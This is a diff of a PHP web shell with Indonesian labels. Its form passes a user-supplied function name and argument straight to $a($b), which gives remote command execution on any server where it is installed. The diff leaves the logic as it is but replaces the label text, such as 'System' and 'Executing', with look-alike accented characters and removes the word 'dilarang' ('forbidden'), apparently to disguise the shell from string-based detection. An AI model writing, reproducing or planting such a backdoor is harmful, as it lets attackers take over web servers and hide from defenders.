@@ -2,8 +2,8 @@
 <html>
 <body>
     <form method="POST">
-        <input type="text" name="x" placeholder="Fungsi (ex: system)">
-        <input type="text" name="y" placeholder="Perintah (ex: ls -la)">
+        <input type="text" name="x" placeholder="Fungsi (ëx: Śystëm)">
+        <input type="text" name="y" placeholder="Perintah (ëx: id)">
         <input type="submit" value="Run">
     </form>
     <pre>
@@ -12,7 +12,7 @@
         $a = $_POST['x'];
         $b = $_POST['y'];
 
-        echo "<b style='color:#fff;'>Executing: $a(\"$b\")</b>\n\n";
+        echo "<b style='color:#fff;'>Ēxecuting: $a(\"$b\")</b>\n\n";
 
         if (is_callable($a)) {
             if ($a === 'popen') {
@@ -26,10 +26,11 @@
                 echo @$a($b);
             }
         } else {
-            echo "<span style='color:red;'>Fungsi '$a' tidak tersedia atau dilarang</span>";
+            echo "<span style='color:red;'>Ƒungsi '$a' tidāk tersediā</span>";
         }
     }
     ?>
     </pre>
 </body>
+
 </html>
